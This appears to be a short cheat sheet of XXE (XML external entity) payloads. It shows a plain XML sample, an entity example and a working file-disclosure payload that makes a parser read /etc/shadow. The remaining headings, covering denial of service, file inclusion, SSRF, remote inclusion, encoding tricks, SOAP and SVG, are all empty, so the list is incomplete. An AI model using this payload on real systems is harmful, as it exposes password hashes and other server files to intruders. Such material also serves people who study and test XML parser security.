#   Basic XML Example

    <!--?xml version="1.0" ?-->
    <userInfo>
     <firstName>John</firstName>
     <lastName>Doe</lastName>
    </userInfo>
    
***************************************

#   Entity Example

    <!--?xml version="1.0" ?-->
    <!DOCTYPE replace [<!ENTITY example "Doe"> ]>
     <userInfo>
      <firstName>John</firstName>
      <lastName>&example;</lastName>
     </userInfo>


#   File Disclosure

        <!--?xml version="1.0" ?-->
        <!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/shadow"> ]>
        <userInfo>
         <firstName>John</firstName>
         <lastName>&ent;</lastName>
        </userInfo>



#   Denial-of-Service Example



#   Local File Inclusion Example


#   Blind Local File Inclusion Example (When first case doesn't return anything.)



#   Access Control Bypass (Loading Restricted Resources - PHP example)



#   SSRF ( Server Side Request Forgery ) Example


#   (Remote Attack - Through External Xml Inclusion) Exmaple


#   UTF-7 Exmaple



#   Base64 Encoded



#   XXE inside SOAP Example


#   XXE inside SVG

